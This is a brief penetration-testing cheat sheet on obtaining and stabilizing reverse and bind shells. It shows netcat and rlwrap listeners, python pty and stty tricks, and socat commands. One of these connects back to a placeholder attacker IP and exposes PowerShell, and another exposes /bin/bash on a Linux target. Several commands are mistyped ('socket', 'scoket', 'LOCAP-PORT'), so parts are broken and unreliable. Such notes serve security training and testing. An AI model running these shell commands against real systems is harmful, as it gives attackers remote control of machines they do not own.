# Reverse Shell and Bind Shell Commands

### Using Netcat

Basic listener: `sudo nc -lnvp <PORT>`

Netcat Shell Stabilization:

```bash
sudo nc -lnvp <PORT>
python3 -c 'import pty;pty.spawn("/bin/bash")'
export  TERM=xterm
## Press CTRL+Z to background the process.
stty raw -echo; fg
```

> **Note:** If the shell is loss or dies, any input in your own (local) terminal will not be visible (as a result of having disable terminal echo). To fix this type `reset` and press Enter.

Another useful technique **(It is useful for getting reverse shell from Windows):**

```bash
sudo apt install rlwrap
rlwrap nc -lnvp <PORT>
## Press CTRL+Z to background the process.
stty raw -echo; fg
```

***

### Using Socket

Basic Listener: `socat -d -d TCP-LISTEN:<PORT> STDOUT`

On Windows we use this command to connect back:

```powershell
socket TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
```

> The `pipes` option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.&#x20;

The equivalent command for Linux target:

```
scoket TCP-L:<PORT> EXEC:"/bin/bash" -li
```
